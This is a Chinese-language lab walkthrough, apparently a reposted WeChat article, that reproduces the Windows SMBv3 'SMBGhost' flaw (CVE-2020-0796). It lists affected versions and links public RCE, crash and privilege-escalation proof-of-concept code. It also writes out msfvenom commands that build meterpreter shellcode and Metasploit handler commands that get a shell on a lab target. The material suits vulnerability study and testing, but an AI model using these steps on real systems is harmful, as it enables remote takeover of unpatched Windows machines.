<meta name="referrer" content="no-referrer"/>
\> 本文由 \[简悦 SimpRead\](http://ksria.com/simpread/) 转码， 原文地址 \[mp.weixin.qq.com\](https://mp.weixin.qq.com/s/hRGai3yyogNVpU1QwhcbfQ)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDDLE7ic82qE4RJVWm6ibRVAiaiaWesdPZJ7px6V9nGJDz2ZqEyeticHF4spns9KKWZhXUpqWXnUqgV3kqw/640?wx_fmt=png)

简介

SMB(全称是 Server Message Block) 是一个协议名，它能被用于 Web 连接和客户端与服务器之间的信息沟通。

漏洞概述

(CVE-2020-0796 SMBGhost) 该漏洞是由于 SMBv3 协议在处理恶意的压缩数据包时出错所造成的，它可让远程且未经身份验证的攻击者在目标系统上执行任意代码。该漏洞的后果十分接近永恒之蓝系列，都利用 Windows SMB 漏洞远程攻击获取系统最高权限，WannaCry 勒索蠕虫就是利用永恒之蓝系列漏洞攻击工具制造的大灾难。

影响版本

适用于 32 位系统的 Windows 10 版本 1903

Windows 10 1903 版（用于基于 x64 的系统）

Windows 10 1903 版（用于基于 ARM64 的系统）

Windows Server 1903 版（服务器核心安装）

适用于 32 位系统的 Windows 10 版本 1909

Windows 10 版本 1909（用于基于 x64 的系统）

Windows 10 1909 版（用于基于 ARM64 的系统）

Windows Server 版本 1909（服务器核心安装）

这里是我使用的 Windows10 版本的靶机

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDDLE7ic82qE4RJVWm6ibRVAiaiaszPdAJWDSDYmSIia2xsjTmX7nHom6vU6eicH5CBCSZAicgPFiaCKfia0JEg/640?wx_fmt=png)

环境搭建  
Kali 虚拟机以及 windows10 虚拟机  
可在虚拟机中搭建 win10 系统来进行复现。迅雷链接：

ed2k://|file|cn\_windows\_10\_business\_editions\_version\_1903\_x64\_dvd\_e001dd2c.iso|4815527936|47D4C57E638DF8BF74C59261E2CE702D|/

使用扫描工具来验证是否由该漏洞

https://github.com/ollypwn/SMBGhost

可以看到该版本是具有 SMBv3 RCE 漏洞的

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDDLE7ic82qE4RJVWm6ibRVAiaiaCyibctiaFtC8ZibwAIfibFmc2OemEibO4DI6vePurdFoEzI6Dibqpj2swVhw/640?wx_fmt=png)

漏洞复现  
EXP 地址：

https://github.com/chompie1337/SMBGhost\_RCE\_PoC

该 exp 使用环境为 python3  
下载完成后将该 exp 放到 Kali 虚拟机中  
启动 msf，使用 msf 生成 shellcode  
命令为：

msfvenom -p windows/x64/meterpreter/bind\_tcp lport=3333 -f py -o shellcode.txt

如果不输入为 txt 就使用这一条

msfvenom -p windows/x64/meterpreter/bind\_tcp LPORT=8888 -b '\\x00' -i 1 -f python

执行该命令后会在同目录下生成一个 shellcode.txt，将生成的 shellcode 替换 exp 中的 exploit.py 中的 USER\_PAYLOAD 保存即可。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDDLE7ic82qE4RJVWm6ibRVAiaiaYdiaz1c3nrJJaAqDj3pMaL004vPVvSUj2D57UPAvAPUAWzxuibkhsbJQ/640?wx_fmt=png)

替换到 exploit.py 里面。注意这里 MSF 给出的是 buf 在 exploit.py 里面是 USER\_PAYLOAD 这个需要修改一下

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDDLE7ic82qE4RJVWm6ibRVAiaiaoiaXIL7OhBavbt8mJ1qVMjBiafoSMLePaYZ7hnibzkr6wUo8ce1pjnDDA/640?wx_fmt=png)

修改好了 exp 文件之后，在 MSF 上面设置监听

use exploit/multi/handler

set payload windows/x64/meterpreter/bind\_tcp

set lport 8888

set rhost 192.168.8.138

run

使用 exp 对 windows 进行反弹 shell。这里成功了并且没有蓝屏的现象

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDDLE7ic82qE4RJVWm6ibRVAiaiaIdR5gE0VO9RSiaKwibqcJqsX1rvlMReibPSvia5Bgt8BwrPXRf3Pm036kg/640?wx_fmt=png)

蓝屏的 POC。这个 POC 可以把由这个漏洞的 windows10 系统打到蓝屏

https://github.com/eerykitty/CVE-2020-0796-PoC

在执行的时候需要注意要安装一些包和注意路径的问题

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDDLE7ic82qE4RJVWm6ibRVAiaiaFM8DpNXNick6wdAHACfYD2JjN7kUgX2sfsxIULxy3FdJpr409kse6Hg/640?wx_fmt=png)

本地提权 POC

https://github.com/danigargu/CVE-2020-0796

编译好了的版本如下：

https://github.com/danigargu/CVE-2020-0796/releases

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDDLE7ic82qE4RJVWm6ibRVAiaiaKjZkJcWAKhrju7RZkdH6tfszIaicQkEKMvyLkK2e3L208HXSIPciacVQ/640?wx_fmt=png)

渗透测试 红队攻防 免杀 权限维持 等等技术 

及时分享最新漏洞复现以及 EXP 国内外最新技术分享!!!

进来一起学习吧

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/nzxUaDY8yDC1QHAC8PAV6JaPBJno5cRxvqAVB1pm0tOZd3TQM7jCB5nTbnfa40GHHQFIWpFFRuHCCCdtykVQWQ/640?wx_fmt=jpeg)